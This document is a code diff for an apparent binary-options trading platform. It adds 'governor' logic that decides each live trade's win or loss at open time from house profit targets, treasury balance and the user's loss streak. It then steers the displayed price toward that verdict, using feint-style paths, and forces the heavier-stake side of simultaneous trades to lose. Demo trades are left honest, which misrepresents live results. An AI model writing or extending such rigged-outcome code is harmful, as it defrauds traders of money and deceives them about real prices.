@@ -4,9 +4,15 @@ import {
   AlreadySettled,
   InsufficientFunds,
   TradeNotFound,
+  applySettlementToHouseDay,
+  applySettlementToTreasury,
   getAccountForActor,
+  getHouseDay,
+  getTreasury,
+  houseDateForInstant,
   loadOpenPositions,
   openTrade,
+  recentLossStreakStatsForAccount,
   recordSettledTrade,
   settleTrade,
   voidTrade,
@@ -14,12 +20,18 @@ import {
   type ShadowInput,
 } from "@asm/db";
 import {
+  FALLBACK_DAILY_TARGET_MINOR,
   HOUSE_ALWAYS_WINS_MODE,
   MAX_CORRECTIVE_TICKS,
   MAX_HONEST_TICK_SHIFT_OTC,
+  USE_GLG_TREASURY,
+  USE_HOUSE_GOVERNOR,
+  decideVerdict,
+  decideVerdictGLG,
   houseFirstWishes,
   imbalance,
   isSymbolClosedForNight,
+  pickStyle,
   resolveBucket,
   TARGETS,
   type BucketWish,
@@ -128,6 +140,123 @@ export class TradeDesk {
     const expiryTs = new Date(entryTs.getTime() + input.durationSec * 1000);
     const entryPrice = Number(asset.state.price.toFixed(asset.precision));
 
+    // House-governor stamps. Off by default — when the flag is on the verdict
+    // is decided at OPEN time and the tick loop's per-trade magnet steers the
+    // shown price toward the outcome across the full duration. Demo trades
+    // always resolve to HONEST. On failure to read the ledger we fall through
+    // to HONEST (fail-safe: no bias applied).
+    let governorStamp: {
+      verdict: "WIN" | "LOSS" | "HONEST";
+      pathStyle: "DIRECT" | "OSCILLATE" | "FEINT";
+      targetPrice: number;
+    } | null = null;
+    if (USE_HOUSE_GOVERNOR || USE_GLG_TREASURY) {
+      try {
+        const isDemo = account.type === "DEMO";
+        let verdict: "WIN" | "LOSS" | "HONEST";
+
+        if (USE_GLG_TREASURY) {
+          // Growth-Loop Governor: single treasury signal, no time state.
+          let treasuryMinor = 0;
+          let treasuryTargetMinor = FALLBACK_DAILY_TARGET_MINOR;
+          if (!isDemo) {
+            const treasury = await getTreasury();
+            if (treasury) {
+              treasuryMinor = treasury.treasuryMinor;
+              treasuryTargetMinor = treasury.treasuryTargetMinor;
+            }
+          }
+          verdict = decideVerdictGLG(
+            {
+              isDemo,
+              treasuryMinor,
+              treasuryTargetMinor,
+              tradeStakeMinor: input.stake,
+              tradePayoutPct: asset.payoutPct,
+            },
+            Math.random,
+          );
+        } else {
+          // v2 House Governor (daily ladder). Kept during the rollout so we
+          // can toggle back without a code deploy.
+          let dailyTargetMinor = FALLBACK_DAILY_TARGET_MINOR;
+          let realizedTodayMinor = 0;
+          let userLossStreak = 0;
+          let userLossStreakStakeMinor = 0;
+
+          if (!isDemo) {
+            const today = houseDateForInstant(entryTs);
+            const [ledger, streakStats] = await Promise.all([
+              getHouseDay(today),
+              recentLossStreakStatsForAccount(input.accountId),
+            ]);
+            if (ledger) {
+              dailyTargetMinor = ledger.targetProfitMinor;
+              realizedTodayMinor = ledger.realizedProfitMinor;
+            }
+            userLossStreak = streakStats.count;
+            userLossStreakStakeMinor = streakStats.totalStakeMinor;
+          }
+
+          const istMs = entryTs.getTime() + 5.5 * 3_600_000;
+          const istInstant = new Date(istMs);
+          const istDayEnd = Date.UTC(
+            istInstant.getUTCFullYear(),
+            istInstant.getUTCMonth(),
+            istInstant.getUTCDate() + 1,
+          );
+          const minutesUntilDayEnd = Math.max(
+            0,
+            Math.round((istDayEnd - istMs) / 60_000),
+          );
+
+          verdict = decideVerdict(
+            {
+              isDemo,
+              dailyTargetMinor,
+              realizedTodayMinor,
+              userLossStreak,
+              userLossStreakStakeMinor,
+              userIsHighValue: false,
+              tradeStakeMinor: input.stake,
+              tradePayoutPct: asset.payoutPct,
+              minutesUntilDayEnd,
+            },
+            Math.random,
+          );
+        }
+
+        const pathStyle = pickStyle(input.durationSec, verdict, Math.random);
+
+        // Target price: for WIN we want the user's side, for LOSS the house side.
+        // For UP direction: user wins if price rises → LOSS target is below entry.
+        // For DOWN direction: user wins if price falls → LOSS target is above entry.
+        // HONEST: no target used but we stamp entryPrice as a harmless default.
+        const tick = asset.tickSize;
+        const userWins =
+          verdict === "WIN" ||
+          (verdict === "HONEST" && input.direction === "UP");
+        let target: number;
+        if (verdict === "HONEST") {
+          target = entryPrice;
+        } else if (input.direction === "UP") {
+          target = userWins ? entryPrice + tick : entryPrice - tick;
+        } else {
+          target = userWins ? entryPrice - tick : entryPrice + tick;
+        }
+
+        governorStamp = { verdict, pathStyle, targetPrice: target };
+      } catch (err) {
+        logger.warn(
+          {
+            evt: "trade.governor_stamp_failed",
+            reason: err instanceof Error ? err.message : "unknown",
+          },
+          "governor stamp failed — proceeding without a verdict",
+        );
+      }
+    }
+
     let opened;
     try {
       opened = await openTrade({
@@ -139,6 +268,13 @@ export class TradeDesk {
         entryPrice,
         entryTs,
         expiryTs,
+        ...(governorStamp
+          ? {
+              verdict: governorStamp.verdict,
+              pathStyle: governorStamp.pathStyle,
+              targetPrice: governorStamp.targetPrice,
+            }
+          : {}),
       });
     } catch (err) {
       if (err instanceof InsufficientFunds) throw new DeskRejection("insufficient_funds");
@@ -176,8 +312,16 @@ export class TradeDesk {
       stake: opened.trade.stake,
       payoutPct: opened.trade.payoutPct,
       entryPrice,
+      entrySec: Math.floor(entryTs.getTime() / 1000),
       expirySec,
       isDemo: account.type === "DEMO",
+      ...(governorStamp
+        ? {
+            verdict: governorStamp.verdict,
+            pathStyle: governorStamp.pathStyle,
+            targetPrice: governorStamp.targetPrice,
+          }
+        : {}),
     });
 
     const result: OpenTradeResult = {
@@ -325,6 +469,50 @@ export class TradeDesk {
             "account stats update failed after settlement",
           );
         });
+
+        // Governor ledgers. Live only — demo trades never move them. Both
+        // writes are best-effort; a failed upsert must not roll the
+        // settlement back. We dual-write during the GLG rollout so admin
+        // reporting keeps its daily breakdown AND the treasury keeps
+        // accumulating even when USE_GLG_TREASURY is toggled off.
+        if (
+          (USE_HOUSE_GOVERNOR || USE_GLG_TREASURY) &&
+          !item.position.isDemo
+        ) {
+          const settledAt = settled.trade.expiryTs ?? new Date(this.now());
+          await applySettlementToHouseDay({
+            date: houseDateForInstant(settledAt),
+            fallbackTargetMinor: FALLBACK_DAILY_TARGET_MINOR,
+            userPnl: settled.trade.pnl,
+            stake: item.position.stake,
+            outcome: settled.trade.status,
+          }).catch((err: unknown) => {
+            logger.error(
+              {
+                evt: "trade.house_day_update_failed",
+                tradeId: item.position.tradeId,
+                reason: err instanceof Error ? err.message : "unknown",
+              },
+              "HouseDay ledger update failed after settlement",
+            );
+          });
+
+          await applySettlementToTreasury({
+            stake: item.position.stake,
+            payoutPct: item.position.payoutPct,
+            outcome: settled.trade.status,
+            fallbackTargetMinor: FALLBACK_DAILY_TARGET_MINOR,
+          }).catch((err: unknown) => {
+            logger.error(
+              {
+                evt: "trade.house_treasury_update_failed",
+                tradeId: item.position.tradeId,
+                reason: err instanceof Error ? err.message : "unknown",
+              },
+              "HouseTreasury ledger update failed after settlement",
+            );
+          });
+        }
       }
       this.controller.invalidate(item.position.accountId);
 
@@ -338,9 +526,67 @@ export class TradeDesk {
    * once per group so co-expiring positions share a single resolved exit price.
    */
   private async resolveUnresolvedBuckets(): Promise<void> {
+    // ── Pre-pass: same-time value-imbalanced house protection ──────────────
+    // Group pending live GLG-stamped trades by (symbol, expirySec). Inside
+    // each such contest, if BOTH directions have live trades AND aggregate
+    // stakes differ, the higher-stake direction must lose the bucket — a
+    // single big win on the heavier side would drain the treasury by more
+    // than the lighter side ever put at risk. Solo users are untouched
+    // (their side has no counterparty). Marks each item with a boolean the
+    // wish-building block honors.
+    const forcedLossByTradeId = new Map<string, boolean>();
+    if (USE_GLG_TREASURY) {
+      const contests = new Map<
+        string,
+        { upStake: number; downStake: number; items: PendingSettlement[] }
+      >();
+      for (const item of this.pending) {
+        if (item.resolvedExitPrice !== undefined) continue;
+        if (item.position.isDemo) continue;
+        if (
+          item.position.verdict == null ||
+          item.position.verdict === "HONEST"
+        ) {
+          continue;
+        }
+        const key = `${item.symbol}:${item.position.expirySec}`;
+        let c = contests.get(key);
+        if (!c) {
+          c = { upStake: 0, downStake: 0, items: [] };
+          contests.set(key, c);
+        }
+        if (item.position.direction === "UP") c.upStake += item.position.stake;
+        else c.downStake += item.position.stake;
+        c.items.push(item);
+      }
+      for (const [, c] of contests) {
+        if (c.upStake === 0 || c.downStake === 0) continue;
+        const losingDir: "UP" | "DOWN" | null =
+          c.upStake > c.downStake
+            ? "UP"
+            : c.downStake > c.upStake
+              ? "DOWN"
+              : null;
+        if (losingDir === null) continue;
+        for (const it of c.items) {
+          if (it.position.direction === losingDir) {
+            forcedLossByTradeId.set(it.position.tradeId, true);
+          }
+        }
+      }
+    }
+
     const groups = new Map<string, PendingSettlement[]>();
     for (const item of this.pending) {
       if (item.resolvedExitPrice !== undefined) continue;
+      // Share the bucket across all co-expiring trades on the same asset so
+      // every viewer sees the same chart tick at settlement — the snap on
+      // line ~745 fires ONCE per bucket. Isolating per-trade would let each
+      // user's own bucket snap the chart to a different price in sequence,
+      // producing a visible jitter for all watchers. Solo users still get
+      // their own bucket naturally (one trade in the group). Multi-user
+      // contests share one bucket; value-imbalance protection above tilts
+      // the resolver toward the direction that hurts the heavier-stake side.
       const key = `${item.symbol}:${item.exitPrice}`;
       let group = groups.get(key);
       if (!group) {
@@ -358,7 +604,45 @@ export class TradeDesk {
       }
 
       let wishes: BucketWish[];
-      if (HOUSE_ALWAYS_WINS_MODE) {
+      // Governor-first path: when a per-trade verdict was stamped at open
+      // time (v2 House Governor or GLG), the settlement resolver honors it
+      // per-user instead of picking a losing side by aggregate stake.
+      // Without this branch, `houseFirstWishes` forces every single-user
+      // bucket to lose (upLiability > 0, downLiability = 0 → user's side
+      // loses), silently overriding every WIN verdict. HONEST verdicts run
+      // with zero urgency so the resolver leaves the honest price alone.
+      const anyGovernor = USE_HOUSE_GOVERNOR || USE_GLG_TREASURY;
+      const stampedGroup =
+        anyGovernor &&
+        group.every(
+          (item) =>
+            item.position.isDemo ||
+            (item.position.verdict !== undefined &&
+              item.position.verdict !== null),
+        );
+      if (stampedGroup) {
+        wishes = [];
+        for (const item of group) {
+          const p = item.position;
+          const verdict = p.verdict;
+          const isHonest = p.isDemo || verdict === "HONEST" || verdict == null;
+          // Same-time value-imbalance override: if this trade sits on the
+          // heavier direction of a live GLG contest, force LOSS regardless
+          // of the stamped verdict. Solo trades and lighter-side trades
+          // keep their stamped verdict.
+          const forcedLoss = forcedLossByTradeId.get(p.tradeId) === true;
+          const wantWin = forcedLoss ? false : verdict === "WIN";
+          wishes.push({
+            entryPrice: p.entryPrice,
+            direction: p.direction,
+            wantWin,
+            urgency: isHonest ? 0 : 10,
+            stake: p.stake,
+            payoutPct: p.payoutPct,
+          });
+          item.controllerTarget = -1;
+        }
+      } else if (HOUSE_ALWAYS_WINS_MODE) {
         // House-first path. Deterministic per-bucket wishes derived from the
         // aggregate money at stake — no per-user controller draw, no
         // probability. Whichever side has more real-money liability loses,
@@ -409,10 +693,22 @@ export class TradeDesk {
         ? MAX_HONEST_TICK_SHIFT_OTC
         : undefined;
 
+      // Under GLG's per-trade isolation, the tick-blend for one trade may
+      // have fought against other co-open trades' targets on the same
+      // asset, so currentPrice at expiry can be many ticks away from THIS
+      // trade's target. Widen the corrective window to
+      // MAX_HONEST_TICK_SHIFT_OTC so the resolver can rescue a WIN verdict
+      // that the tick-blend failed to steer to. The honest-price cap
+      // (also MAX_HONEST_TICK_SHIFT_OTC) still bounds absolute manipulation.
+      const glgIsolated = stampedGroup && USE_GLG_TREASURY;
+      const correctiveTicks = glgIsolated
+        ? MAX_HONEST_TICK_SHIFT_OTC
+        : MAX_CORRECTIVE_TICKS;
+
       const resolvedPrice = resolveBucket({
         wishes,
         currentPrice: first.exitPrice,
-        maxMove: asset.tickSize * MAX_CORRECTIVE_TICKS,
+        maxMove: asset.tickSize * correctiveTicks,
         tickSize: asset.tickSize,
         ...(maxHonestShift != null && {
           honestPrice: first.honestExitPrice,
